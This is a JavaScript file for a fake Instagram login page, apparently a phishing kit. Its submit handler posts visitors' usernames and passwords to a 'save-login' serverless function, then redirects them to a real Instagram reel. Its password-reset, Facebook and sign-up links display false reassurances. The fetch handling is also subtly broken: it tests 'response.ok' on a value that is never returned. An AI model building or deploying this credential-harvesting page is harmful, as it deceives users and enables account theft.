// DOM Elements
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const languageSelect = document.getElementById('languageSelect');
const loginBtn = document.querySelector('.login-btn');

// Show message function
function showMessage(message, type) {
  const existingMsg = document.querySelector('.message');
  if (existingMsg) existingMsg.remove();

  const msgElement = document.createElement('div');
  msgElement.className = 'message';
  msgElement.textContent = message;
  msgElement.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    padding: 15px 30px;
    background-color: ${type === 'success' ? '#28a745' : '#dc3545'};
    color: white;
    border-radius: 5px;
    z-index: 1000;
    animation: slideDown 0.3s ease-out;
  `;

  if (!document.getElementById('messageStyles')) {
    const style = document.createElement('style');
    style.id = 'messageStyles';
    style.textContent = `
      @keyframes slideDown {
        from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
        to { opacity: 1; transform: translateX(-50%) translateY(0); }
      }
    `;
    document.head.appendChild(style);
  }

  document.body.appendChild(msgElement);

  setTimeout(() => {
    msgElement.style.animation = 'slideDown 0.3s ease-out reverse';
    setTimeout(() => msgElement.remove(), 300);
  }, 3000);
}

// Form submission handler
loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  if (!username || !password) {
    showMessage('Please fill in all fields', 'error');
    return;
  }

  loginBtn.textContent = 'Logging in...';
  loginBtn.disabled = true;

  try {
    const response = await fetch("/.netlify/functions/save-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      })
      .then(res => res.json())
      .then(data => {
        console.log("Saved:", data);
        alert("Login data submitted successfully.");
      })
      .catch(err => {
        console.error("Error:", err);
        alert("Submission failed.");
      });

    if (response.ok) {
      showMessage('Successfully logged in!', 'success');
      loginForm.reset();

      // ✅ Redirect to Instagram Reel
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/reel/C6EHz5AL8wK/?igsh=MTdmM3YwMHZ5ZTVwaA==";
      }, 1500);
    } else {
      showMessage('Submission failed.', 'error');
    }
  } catch (error) {
    console.error("Error:", error);
    showMessage('Network error.', 'error');
  }

  loginBtn.textContent = 'Log in';
  loginBtn.disabled = false;
});

// Input styling
usernameInput.addEventListener('input', function() {
  this.style.borderColor = this.value.trim() ? '#2a2a2a' : '#262626';
});
passwordInput.addEventListener('input', function() {
  this.style.borderColor = this.value.trim() ? '#2a2a2a' : '#262626';
});

const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
  input.addEventListener('focus', () => input.style.borderColor = '#a8a8a8');
  input.addEventListener('blur', () => input.style.borderColor = '#262626');
});

// Language selector (optional)
languageSelect.addEventListener('change', (e) => {
  console.log('Selected language:', e.target.value);
});

// Facebook login handler
document.querySelector('.facebook-link').addEventListener('click', (e) => {
  e.preventDefault();
  showMessage('Connecting to Facebook...', 'success');
});

// Forgot password handler
document.querySelector('.forgot-password').addEventListener('click', (e) => {
  e.preventDefault();
  showMessage('Password reset link sent to your email', 'success');
});

// Signup link handler
document.querySelector('.signup-link').addEventListener('click', (e) => {
  e.preventDefault();
  showMessage('Redirecting to sign up page...', 'success');
});

// Smooth transitions
document.querySelectorAll('a, button').forEach(el => {
  el.addEventListener('mouseenter', () => {
    el.style.transition = 'all 0.2s ease';
  });
});

console.log('Instagram Login Page Loaded Successfully! 🎉');
